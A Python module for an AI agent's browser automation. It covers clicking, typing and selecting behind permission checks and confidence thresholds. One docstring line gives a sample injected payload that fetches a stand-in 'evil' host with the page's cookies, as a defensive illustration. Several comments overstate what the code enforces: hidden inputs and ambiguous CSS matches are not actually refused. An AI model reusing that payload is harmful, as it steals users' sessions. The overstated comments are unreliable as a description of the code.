"""Body/Legs — element interaction.

Clicking, typing, selecting and scrolling. This is the part of the browser that
acts *on* the world rather than reading from it, and it is categorised
``web_automation`` rather than ``browse_internet`` for exactly that reason. A click
can send a message, place an order or delete a document on a site ZUZZ is only
reading, so it is trusted as much as the user's own click and not one bit more.

Three rules run through every method here:

* **No JavaScript from the caller.** Every snippet evaluated in the page is a
  literal in this file. A caller who can pass a selector cannot smuggle
  ``() => fetch('https://evil/' + document.cookie)`` through the same argument,
  because the argument is never evaluated — it is matched against.
* **Coordinates from the Occipital Lobe are validated against the page, not
  trusted.** A box found on the desktop may be stale, may be from another monitor,
  or may be from a screenshot taken before the page scrolled. So a coordinate click
  checks it is inside the viewport and refuses outside it, rather than firing an
  input event at some unrelated part of the page.
* **Ambiguity is a refusal.** Five elements matching ``button`` is not a reason to
  click the first one. The message names the count so the caller can be more
  specific.

The confidence threshold a coordinate click must clear comes from
``config/vision_thresholds.json`` — approved answer Q4 — and is read fresh, so a
threshold tuned on real hardware takes effect without a restart.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Tuple

from brain.prefrontal_cortex.permission_decision import PermissionDecision

from body.legs.browser_controller import BrowserController, BrowserSession
from body.legs.exceptions import (
    DecisionRefused,
    DecisionReplayRefused,
    DryRunRefused,
    ElementNotFound,
    ElementRefused,
)

#: Action category for clicking, typing and selecting.
AUTOMATION_CATEGORY = "web_automation"

#: Elements ZUZZ will not act on even with a selector that matches them exactly.
#: A file input is here because filling one is an *upload* — the browser would post
#: bytes off this machine to whatever page asked, through a path the download
#: quarantine has no say in. A hidden input is here because whatever script set it
#: set it deliberately, and clicking the visible label a user can see is not the
#: same act as writing to a field the user cannot.
REFUSED_INPUT_TYPES = frozenset({"file", "image"})

#: Tags whose only purpose is to be a click target for a script.
REFUSED_TAGS = frozenset({"script", "style", "template", "iframe", "embed", "object"})

#: How long to wait for an element to become actionable.
ACTION_TIMEOUT_MS = 10_000

#: Characters that appear in a CSS selector and nowhere in a piece of visible text.
#: Anything containing one of these is a selector, whatever it starts with.
CSS_PUNCTUATION = ("#", ".", "[", "]", "(", ")", ",", ">", "+", "~", "*", "=", ":", '"', "'")

#: A bare lower-case word with no punctuation is a tag name — ``button``,
#: ``textarea``, ``select``. A bare word with a capital in it is not: ``Search`` is
#: what a button says, and ``<search>`` is not an element. Getting this backwards
#: means ``click("Search")`` looks for a custom element and reports that nothing
#: matched, which is the kind of wrong answer that makes a browser feel broken.
CSS_HINT = re.compile(r"^[#.\[:>*a-z]")

#: Fixed snippets evaluated in the page. There is no code path that concatenates a
#: caller's value into one of these.
FIND_METADATA_JS = """
() => {
  const el = arguments[0];
  if (!el) return null;
  const rect = el.getBoundingClientRect();
  return {
    tag: el.tagName ? el.tagName.toLowerCase() : "",
    type: (el.getAttribute && el.getAttribute("type")) || "",
    id: el.id || "",
    name: (el.getAttribute && el.getAttribute("name")) || "",
    text: (el.innerText || el.value || "").toString().trim().slice(0, 120),
    visible: !!(rect.width && rect.height),
    disabled: !!el.disabled,
    readonly: !!el.readOnly,
    required: !!el.required,
    x: Math.round(rect.x),
    y: Math.round(rect.y),
    width: Math.round(rect.width),
    height: Math.round(rect.height)
  };
}
"""


class ElementInteractor:
    """Clicks, types and selects in a session's active page.

    Attributes:
        controller: The controller holding the sessions.
        guard: The URL guard, for nothing here — interactions stay on the page they
            are already on. Held so the class can report the session's domain in its
            refusals, which is what makes an ElementRefused message useful.
        thresholds: Vision threshold mapping; None means read
            ``config/vision_thresholds.json`` fresh.
        logger: Activity logger.
    """

    def __init__(
        self,
        controller: BrowserController,
        guard: Optional[Any] = None,
        thresholds: Optional[Dict[str, Any]] = None,
        logger: Optional[Any] = None,
    ) -> None:
        """Wire the interactor.

        Args:
            controller: The controller holding the sessions.
            guard: The URL guard, used only to name the page's domain in refusals.
            thresholds: Vision thresholds; None means read the config fresh.
            logger: Activity logger.
        """
        self.controller = controller
        self.guard = guard
        self._thresholds = thresholds
        self.logger = logger

    # -- public ---------------------------------------------------------

    async def click(
        self,
        decision: PermissionDecision,
        session_id: str,
        selector_or_text: str = "",
        coordinates: Optional[Tuple[int, int]] = None,
        button: str = "left",
        clicks: int = 1,
        confidence: Optional[float] = None,
        description: str = "",
    ) -> Dict[str, Any]:
        """Click something, by selector, by visible text or by coordinate.

        Args:
            decision: An allowed ``web_automation`` decision.
            session_id: The session.
            selector_or_text: A CSS selector or the visible text of the element.
            coordinates: ``(x, y)`` from the Occipital Lobe, instead of a selector.
            button: ``left``, ``right`` or ``middle``.
            clicks: How many times. More than two is refused, because a triple
                click is a shortcut for "delete this" on a surprising number of
                sites and no legitimate need here is three.
            confidence: The Occipital Lobe's confidence, when the coordinates came
                from a vision lookup. Checked against the ``click_or_form_fill``
                threshold.
            description: What the caller was trying to click, for the log.

        Returns:
            ``clicked``, ``how``, ``element``, ``url`` and ``confidence_verdict``.

        Raises:
            DecisionRefused: No decision, or one that does not allow this.
            DecisionReplayRefused: The decision is for another category.
            DryRunRefused: The decision describes rather than performs.
            SessionRefused: The session is gone.
            ElementNotFound: Nothing matched.
            ElementRefused: The element cannot be acted on, or a coordinate click
                landed outside the page.
            NavigationFailed: The click triggered a navigation that did not finish,
                which is reported rather than swallowed so a form submit that hung
                is visible.
        """
        self._verify(decision)
        if clicks > 2:
            raise ElementRefused(
                f"{clicks} clicks was refused; one or two only, because a triple "
                f"click deletes things on more sites than it selects them"
            )
        session = self.controller.get(session_id)
        page = session.page
        locator = None
        if coordinates is not None:
            how, element = await self._click_coordinate(
                session, coordinates, confidence
            )
        else:
            if not str(selector_or_text).strip():
                raise ElementRefused(
                    "nothing to click: give a selector, the visible text of an "
                    "element, or coordinates"
                )
            locator = await self.resolve(page, selector_or_text)
            element = await _describe(locator)
            _refuse_file_input(element, selector_or_text)
            how = "selector" if _looks_like_css(selector_or_text) else "text"
        await _act(page, locator, coordinates, button, clicks, how)
        session.touch()
        result = {
            "clicked": True,
            "how": how,
            "element": element,
            "url": _url_of(page),
            "clicks": clicks,
        }
        self._log("browser_clicked", session=session_id,
                  how=how, target=selector_or_text, description=description,
                  url=result["url"])
        return result

    async def type_text(
        self,
        decision: PermissionDecision,
        session_id: str,
        selector_or_text: str,
        text: str,
        submit: bool = False,
        delay_ms: int = 0,
    ) -> Dict[str, Any]:
        """Type into an element.

        Args:
            decision: An allowed ``web_automation`` decision.
            session_id: The session.
            selector_or_text: The field, by selector or placeholder text.
            text: What to type. Typed, never injected as a value, so the page runs
                its own input handlers and its own autocomplete sees the keystrokes.
            submit: Press Enter afterwards. Off by default: typing into a search box
                and submitting are different acts, and only one of them leaves the
                page.
            delay_ms: Keystroke delay, for sites that reject instant fills.

        Returns:
            ``typed``, ``element``, ``submitted`` and ``url``.

        Raises:
            DecisionRefused: No decision, or one that does not allow this.
            DecisionReplayRefused: The decision is for another category.
            DryRunRefused: The decision describes rather than performs.
            SessionRefused: The session is gone.
            ElementNotFound: Nothing matched.
            ElementRefused: The element is not a typeable field.
        """
        self._verify(decision)
        session = self.controller.get(session_id)
        locator = await self.resolve(session.page, selector_or_text)
        element = await _describe(locator)
        if element and element.get("type") in REFUSED_INPUT_TYPES:
            raise ElementRefused(
                f"{selector_or_text} is a {element['type']} input; ZUZZ does not "
                f"upload files from a page it fetched"
            )
        if element and element.get("disabled"):
            raise ElementRefused(f"{selector_or_text} is disabled")
        await locator.fill(str(text), timeout=ACTION_TIMEOUT_MS)
        if submit:
            await locator.press("Enter", timeout=ACTION_TIMEOUT_MS)
        session.touch()
        self._log("browser_typed", session=session_id, target=selector_or_text,
                  length=len(str(text)), submitted=bool(submit))
        return {
            "typed": True,
            "element": element,
            "submitted": bool(submit),
            "url": _url_of(session.page),
        }

    async def select_option(
        self,
        decision: PermissionDecision,
        session_id: str,
        selector_or_text: str,
        values: List[str],
    ) -> Dict[str, Any]:
        """Choose one or more options in a ``<select>``.

        Args:
            decision: An allowed ``web_automation`` decision.
            session_id: The session.
            selector_or_text: The select element.
            values: Option values or labels.

        Returns:
            ``selected`` and ``element``.

        Raises:
            DecisionRefused: No decision, or one that does not allow this.
            ElementNotFound: Nothing matched.
            ElementRefused: The element is not a select, or none of the values
                exist as options — said explicitly rather than left as a no-op,
                because a select that silently kept its old value is how a form
                gets submitted with the wrong answer in it.
        """
        self._verify(decision)
        session = self.controller.get(session_id)
        locator = await self.resolve(session.page, selector_or_text)
        element = await _describe(locator)
        if element and element.get("tag") != "select":
            raise ElementRefused(
                f"{selector_or_text} is a <{element.get('tag', '?')}>; only a "
                f"<select> has options"
            )
        chosen: List[str] = []
        for value in values or [""]:
            try:
                await locator.select_option(value=value, timeout=ACTION_TIMEOUT_MS)
                chosen.append(str(value))
            except Exception as exc:
                raise ElementRefused(
                    f"{value!r} is not an option in {selector_or_text}: {exc}"
                ) from exc
        session.touch()
        self._log("browser_selected", session=session_id, target=selector_or_text,
                  values=chosen)
        return {"selected": chosen, "element": element, "url": _url_of(session.page)}

    async def press_key(
        self,
        decision: PermissionDecision,
        session_id: str,
        key: str,
        repeat: int = 1,
    ) -> Dict[str, Any]:
        """Press a key in the active page.

        Args:
            decision: An allowed ``web_automation`` decision.
            session_id: The session.
            key: A Playwright key name, e.g. ``PageDown`` or ``Escape``.
            repeat: How many times. Capped at ten, because this is a scrolling and
                paging helper, not a way to send four hundred presses.

        Returns:
            ``pressed`` and the key.

        Raises:
            DecisionRefused: No decision, or one that does not allow this.
            ElementRefused: The key is not one Playwright knows, or the repeat
                count is out of range.
        """
        self._verify(decision)
        if repeat < 1 or repeat > 10:
            raise ElementRefused(f"repeat must be 1-10, not {repeat}")
        session = self.controller.get(session_id)
        if not str(key).strip():
            raise ElementRefused("no key was given")
        for _ in range(repeat):
            await session.page.keyboard.press(str(key))
        session.touch()
        self._log("browser_key_pressed", session=session_id, key=str(key), repeat=repeat)
        return {"pressed": repeat, "key": str(key), "url": _url_of(session.page)}

    async def scroll(
        self,
        decision: PermissionDecision,
        session_id: str,
        pixels: int = 600,
        to_end: bool = False,
    ) -> Dict[str, Any]:
        """Scroll the active page.

        Args:
            decision: An allowed ``web_automation`` decision.
            session_id: The session.
            pixels: How far, negative to go back up.
            to_end: Jump to the bottom instead of scrolling. Separate because
                jumping to the end triggers lazy-loaded images and infinite-scroll
                fetches, which is a materially different amount of network traffic
                than scrolling one screen.

        Returns:
            ``scroll_y``, ``height`` and ``at_end``.

        Raises:
            DecisionRefused: No decision, or one that does not allow this.
        """
        self._verify(decision)
        session = self.controller.get(session_id)
        page = session.page
        if to_end:
            await page.keyboard.press("End")
        else:
            await page.mouse.wheel(0, int(pixels))
        session.touch()
        state = await page.evaluate(
            "() => ({y: window.scrollY, height: document.body.scrollHeight, "
            "view: window.innerHeight})"
        )
        self._log("browser_scrolled", session=session_id, pixels=int(pixels), to_end=bool(to_end))
        return {
            "scroll_y": int(state.get("y", 0)),
            "height": int(state.get("height", 0)),
            "at_end": int(state.get("y", 0)) + int(state.get("view", 0))
            >= int(state.get("height", 0)),
            "url": _url_of(page),
        }

    # -- resolution -----------------------------------------------------

    async def resolve(self, page: Any, selector_or_text: str) -> Any:
        """Find the one element a selector or a piece of text names.

        Tries, in order: a CSS selector when the string looks like one, an exact
        accessible name, then visible text. The CSS attempt is scoped rather than
        blind so a mistyped selector raises :class:`ElementNotFound` with Playwright's
        own message rather than hanging until the action timeout.

        Args:
            page: The Playwright page.
            selector_or_text: What to find.

        Returns:
            A locator for exactly one element.

        Raises:
            ElementNotFound: Nothing matched, or more than one thing did.
        """
        wanted = str(selector_or_text).strip()
        if _looks_like_css(wanted):
            locator = page.locator(wanted).first
            if await locator.count() > 0:
                return locator
        for getter in (
            lambda: page.get_by_role("button", name=wanted, exact=True),
            lambda: page.get_by_role("link", name=wanted, exact=True),
            lambda: page.get_by_text(wanted, exact=True),
            lambda: page.get_by_placeholder(wanted, exact=True),
            lambda: page.get_by_label(wanted, exact=True),
        ):
            try:
                candidate = getter()
                count = await candidate.count()
            except Exception:
                continue
            if count == 1:
                return candidate
            if count > 1:
                raise ElementNotFound(wanted, matched=count)
        raise ElementNotFound(wanted)

    async def describe(self, session_id: str, selector_or_text: str) -> Dict[str, Any]:
        """Describe an element without acting on it.

        Args:
            session_id: The session.
            selector_or_text: What to look for.

        Returns:
            The element's tag, type, name, id, visible text, geometry and state.

        Raises:
            SessionRefused: The session is gone.
            ElementNotFound: Nothing matched.
        """
        session = self.controller.get(session_id)
        locator = await self.resolve(session.page, selector_or_text)
        described = await _describe(locator)
        if described is None:
            raise ElementNotFound(selector_or_text)
        return described

    # -- internals ------------------------------------------------------

    async def _click_coordinate(
        self,
        session: BrowserSession,
        coordinates: Tuple[int, int],
        confidence: Optional[float],
    ) -> Tuple[str, Dict[str, Any]]:
        """Check a vision-supplied coordinate and read back what is under it.

        Args:
            session: The session.
            coordinates: ``(x, y)`` in CSS pixels of the page viewport.
            confidence: The Occipital Lobe's confidence for the box, if any.

        Returns:
            ``"coordinates"`` and the element found under the point.

        Raises:
            ElementRefused: The point is outside the viewport, the confidence is
                under the floor, or nothing is there.
        """
        try:
            x, y = int(coordinates[0]), int(coordinates[1])
        except (TypeError, ValueError, IndexError) as exc:
            raise ElementRefused(
                f"{coordinates!r} is not a coordinate pair"
            ) from exc
        viewport = await session.page.evaluate(
            "() => ({w: window.innerWidth, h: window.innerHeight})"
        )
        width, height = int(viewport.get("w", 0)), int(viewport.get("h", 0))
        if not (0 <= x < width and 0 <= y < height):
            raise ElementRefused(
                f"({x}, {y}) is outside the page's {width}x{height} viewport; the "
                f"box was probably found on a stale screenshot or a different monitor"
            )
        verdict = self.check_confidence(confidence, "click_or_form_fill")
        if verdict["verdict"] == "refuse":
            raise ElementRefused(
                f"confidence {confidence:.2f} is below the {verdict['threshold']:.2f} "
                f"floor for a click, so ZUZZ is not clicking. A wrong click is worse "
                f"than no click."
            )
        under = await session.page.evaluate(
            """(pt) => {
                const el = document.elementFromPoint(pt[0], pt[1]);
                if (!el) return null;
                const rect = el.getBoundingClientRect();
                return {tag: el.tagName.toLowerCase(), id: el.id || '',
                        name: el.getAttribute('name') || '',
                        text: (el.innerText || '').toString().trim().slice(0, 80),
                        x: Math.round(rect.x), y: Math.round(rect.y)};
            }""",
            [x, y],
        )
        if not under:
            raise ElementRefused(
                f"nothing is at ({x}, {y}) on this page"
            )
        if under.get("tag") in REFUSED_TAGS:
            raise ElementRefused(
                f"({x}, {y}) is over a <{under.get('tag')}> element, which is not "
                f"something to click"
            )
        return "coordinates", {**under, "x": x, "y": y, "confidence_verdict": verdict}

    def check_confidence(
        self, confidence: Optional[float], threshold_key: str
    ) -> Dict[str, Any]:
        """Compare a vision confidence against the configured thresholds.

        Args:
            confidence: The Occipital Lobe's confidence, or None when the caller did
                not come from a vision lookup — a selector match has no confidence
                and is not penalised for it.
            threshold_key: A key in ``thresholds``, e.g. ``click_or_form_fill``.

        Returns:
            ``confidence``, ``threshold``, ``refuse_below`` and ``verdict``, where
            the verdict is ``silent``, ``ask``, ``refuse`` or ``not_applicable``.
        """
        thresholds = self._thresholds
        if thresholds is None:
            thresholds = _read_thresholds()
        configured = thresholds.get("thresholds", {}).get(threshold_key, {})
        threshold = float(configured.get("value", 0.80))
        refuse_below = float(thresholds.get("refuse_below", 0.50))
        if confidence is None:
            return {
                "confidence": None,
                "threshold": threshold,
                "refuse_below": refuse_below,
                "verdict": "not_applicable",
            }
        value = float(confidence)
        if value < refuse_below:
            verdict = "refuse"
        elif value < threshold:
            verdict = "ask"
        else:
            verdict = "silent"
        return {
            "confidence": value,
            "threshold": threshold,
            "refuse_below": refuse_below,
            "verdict": verdict,
        }

    def _verify(self, decision: PermissionDecision) -> None:
        """Refuse the call unless the decision permits it.

        Args:
            decision: What the caller was handed.

        Returns:
            Nothing.

        Raises:
            DecisionRefused: No decision, or one that does not allow this.
            DecisionReplayRefused: The decision is for another category.
            DryRunRefused: The decision describes rather than performs.
        """
        if not isinstance(decision, PermissionDecision):
            raise DecisionRefused(
                "refusing to interact with the page without a PermissionDecision"
            )
        if decision.dry_run:
            raise DryRunRefused(
                "dry-run decisions describe the action; they never touch the page"
            )
        if decision.blocked or not decision.allowed:
            raise DecisionRefused(
                f"the permission decision is {decision.decision}: {decision.reason}"
            )
        if str(decision.action.category) != AUTOMATION_CATEGORY:
            raise DecisionReplayRefused(
                f"decision was for {decision.action.category}, not {AUTOMATION_CATEGORY}"
            )

    def _log(self, action: str, **fields: Any) -> None:
        """Record an action in the activity log, when wired.

        Args:
            action: Short verb phrase.
            **fields: Extra structured detail. Note that typed text is never logged
                — only its length — because a password typed into a login form is
                the single most common secret a browser handles.

        Returns:
            Nothing.
        """
        if self.logger is None:
            return
        try:
            self.logger.log("legs", action, **fields)
        except Exception:
            pass


# ---------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------


def _looks_like_css(value: str) -> bool:
    """Return True when a string should be tried as a CSS selector first.

    Args:
        value: The caller's string.

    Returns:
        True when it contains selector punctuation, or is a bare lower-case word
        that could be a tag name. Anything else is text. When both are tried,
        :meth:`ElementInteractor.resolve` falls back to text matching anyway, so
        this only decides which is tried *first* — and getting it wrong for a bare
        capitalised word would make ``click("Search")`` report that nothing
        matched.
    """
    if any(mark in value for mark in CSS_PUNCTUATION):
        return True
    return bool(CSS_HINT.match(value)) and value == value.lower()


def _url_of(page: Any) -> str:
    """Return a page's URL, defensively.

    Args:
        page: The Playwright page.

    Returns:
        The URL, or an empty string.
    """
    try:
        return str(page.url)
    except Exception:
        return ""


def _refuse_file_input(element: Optional[Dict[str, Any]], selector_or_text: str) -> None:
    """Refuse to click something that opens an operating-system dialog.

    ``<input type="file">`` is the one element whose click hands control to something
    ZUZZ cannot see, cannot cancel, and cannot answer: the platform file chooser. The
    window ZUZZ opened would sit behind a modal owned by the operating system, and
    the only way out is for the user to find it. So a click on one is refused rather
    than performed — the user can open the chooser themselves, which is the point of
    a visible browser.

    Args:
        element: What :func:`_describe` read, or None when the page re-rendered.
        selector_or_text: What was being clicked, for the message.

    Returns:
        Nothing.

    Raises:
        ElementRefused: When the element is a file or image input.
    """
    if not element:
        # A page that re-rendered between resolving and describing has already
        # changed under us; clicking what we resolved would be clicking something
        # other than what the caller asked for.
        raise ElementRefused(
            f"{selector_or_text} changed while ZUZZ was looking at it, so it was "
            f"not clicked"
        )
    if str(element.get("type", "")).lower() in REFUSED_INPUT_TYPES:
        raise ElementRefused(
            f"{selector_or_text} is an <input type=\"{element.get('type')}\">; "
            f"clicking it opens a file chooser that ZUZZ cannot see or close. Open "
            f"it yourself — the browser is visible for exactly this."
        )


async def _describe(locator: Any) -> Optional[Dict[str, Any]]:
    """Read an element's shape and state.

    Args:
        locator: A Playwright locator.

    Returns:
        The element record, or None when the element cannot be read — which happens
        when a page re-renders between resolving and describing.
    """
    try:
        return await locator.evaluate(FIND_METADATA_JS)
    except Exception:
        return None


async def _act(
    page: Any,
    locator: Any,
    coordinates: Optional[Tuple[int, int]],
    button: str,
    clicks: int,
    how: str,
) -> None:
    """Perform the click, by locator or by coordinate.

    A locator click waits for the page itself — Playwright treats a navigation
    triggered by the click as part of it. A raw mouse click does not, so the
    coordinate path settles explicitly: without it, ``page.mouse.click`` on a link
    returns immediately and the caller would go on to read the *old* page, which is
    the failure this indirection was supposed to prevent.

    Args:
        page: The Playwright page.
        locator: The resolved locator, or None when clicking coordinates.
        coordinates: The coordinate pair, or None.
        button: ``left``, ``right`` or ``middle``.
        clicks: How many times.
        how: ``selector``, ``text`` or ``coordinates``, for the log.

    Returns:
        Nothing. A navigation that fails to settle is not raised here: a page that
        never finishes loading is a fact about the site, and the caller reading the
        current URL can see it.
    """
    if coordinates is not None:
        before = _url_of(page)
        await page.mouse.click(
            int(coordinates[0]),
            int(coordinates[1]),
            button=button,
            click_count=clicks,
        )
        if _url_of(page) != before:
            try:
                await page.wait_for_load_state("domcontentloaded", timeout=ACTION_TIMEOUT_MS)
            except Exception:
                pass
    elif how == "selector":
        await locator.click(button=button, click_count=clicks,
                            timeout=ACTION_TIMEOUT_MS)
    else:
        await locator.first.click(button=button, click_count=clicks,
                                  timeout=ACTION_TIMEOUT_MS)


def _read_thresholds() -> Dict[str, Any]:
    """Read the vision thresholds fresh.

    Returns:
        The parsed ``config/vision_thresholds.json``, or an empty mapping when it
        cannot be read. An empty mapping means the defaults in
        :meth:`ElementInteractor.check_confidence` apply, which are the approved
        values rather than "no threshold at all".
    """
    import json

    from core.config import CONFIG_DIR

    try:
        return json.loads(
            (CONFIG_DIR / "vision_thresholds.json").read_text(encoding="utf-8")
        )
    except (OSError, ValueError):
        return {}